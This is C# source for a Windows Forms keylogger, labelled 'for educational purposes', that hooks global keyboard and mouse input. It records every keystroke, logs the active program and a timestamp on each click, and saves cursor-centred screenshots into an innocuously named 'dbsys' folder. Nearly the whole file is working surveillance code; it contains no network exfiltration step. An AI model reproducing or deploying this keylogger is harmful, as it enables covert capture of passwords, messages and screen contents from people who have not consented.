
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Runtime.InteropServices;
using System.Threading;
using System.Drawing.Imaging;
using System.Windows.Input;
using System.IO;

/*
###########################################
#Simple Keylogger for eductional purposes #
#           Coded By DzNiT0               #
###########################################

*/
namespace Keylogger
{
    public partial class Form1 : Form
    {
        public static Point MousePosition = new Point();
        public Form1()
        {
            InitializeComponent();
        }
        GlobalKeyboardHook gHook;
        private void Form1_Load(object sender, EventArgs e)
        {
            button2.Enabled = false;
            try {
                gHook = new GlobalKeyboardHook(); // Create a new GlobalKeyboardHook
                                                  // Declare a KeyDown Event
                gHook.KeyUp += new KeyEventHandler(gHook_KeyUp);
                gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
                // Add the keys you want to hook to the HookedKeys list
                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                    gHook.HookedKeys.Add(key);
            }
            catch (Exception z)
            {

            }

        }
        //The function called once the Key PressedUp {for CTRL Alt ...etc}
        public void gHook_KeyUp(object sender, KeyEventArgs e)
        {
            
            String getCharVar = getCharUp(e.KeyValue);
            if (getCharVar != null)
                richTextBox1.Text += getCharVar;
            
        }
        //The function called once the Key PressedDown {for the rest of Pressed Keys}
        public void gHook_KeyDown(object sender, KeyEventArgs e)
        {

            String getCharVar = getCharDown(e.KeyValue);
           if(getCharVar!=null)
                richTextBox1.Text += getCharVar;

        }

        private void button1_Click(object sender, EventArgs e)
        {
            button1.Enabled = false;
            button2.Enabled = true;
            try { 
            //Start the Mouse Hook
            MouseHook.Start();
            MouseHook.MouseAction += new EventHandler(Event);
            //Start the KeyboardHook
            gHook.hook();
            }
            catch (Exception z)
            {

            }
        }
        //The function called once the mouse left click event triggered
        private void Event(object sender, EventArgs e) {
            // get the Active Window Program's name + time and dump them in the richText 
            try {
                DateTime Now0 = DateTime.Now;
                richTextBox1.Text+=
                    "\n#" +Now0.Day + "/" + Now0.Month + "/" + Now0.Year + " " + Now0.Hour + ":" + Now0.Minute + ":" + Now0.Second +"# [ActiveProgram --"+ ActiveApp.getActiveProccess()+"--]";
            // taking a snap where the mouse is its center
                Bitmap printscreen = new Bitmap(150, 150);

            Graphics graphics = Graphics.FromImage(printscreen as Image);
            
            graphics.CopyFromScreen(MousePosition.X-75, MousePosition.Y-75, 0, 0, printscreen.Size);
            DateTime Now =  DateTime.Now;

                if(!Directory.Exists(Environment.CurrentDirectory +"\\dbsys"))
                    Directory.CreateDirectory(Environment.CurrentDirectory + "\\dbsys");

                printscreen.Save(Environment.CurrentDirectory + "\\dbsys\\db_[" + Now.Day + "-" + Now.Month + "-" + Now.Year + "___" + Now.Hour + "_" + Now.Minute + "_" + Now.Second + "]", ImageFormat.Jpeg);

            }
            catch (Exception z)
            {
                
            }
        }
       

        private void button2_Click(object sender, EventArgs e)
        {
            button1.Enabled = true;
            button2.Enabled = false;
            try {
                //Stop Hooks
                gHook.unhook();
                MouseHook.stop();
            }
            catch (Exception z)
            {

            }
        }
        // Filter the Keyboard's KeyValues
        private String getCharUp(int Value)
        {
           
            switch (Value) {
                case 8:
                    return "[Backspace]";
                case 9 :
                    return "[Tab]";
                case 13:
                    return "[Enter]";
                case 160:
                    return "[Shift]";
                case 162:
                    return "[CTRL]";
                case 164:
                    return "[Alt]";
                case 20:
                    if (Control.IsKeyLocked(Keys.CapsLock))
                        return "[Caps Lock ON]";
                    else
                        return "[Caps Lock OFF]";
                case 32:
                    return "[Space]";
                case 46:
                    return "[Delete]";
                case 163:
                    return "[R_Alt]";
                case 165:
                    return "[R_Ctrl]";

                default:
                    return null;
            }
        }
        private String getCharDown(int Value)
        {

            if (Value > 95 && Value < 106)
                return ((char)(Value-48)).ToString();

            if (Value > 64 && Value < 91)
            {if(!Control.IsKeyLocked(Keys.CapsLock))
                return ((char)(Value+32)).ToString();
            else
                    return ((char)(Value)).ToString();
            }
            if (Value > 47 && Value < 58)
                return ((char)Value).ToString();
            

            return null;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            gHook.unhook();
            MouseHook.stop();
        }

        
    }
}
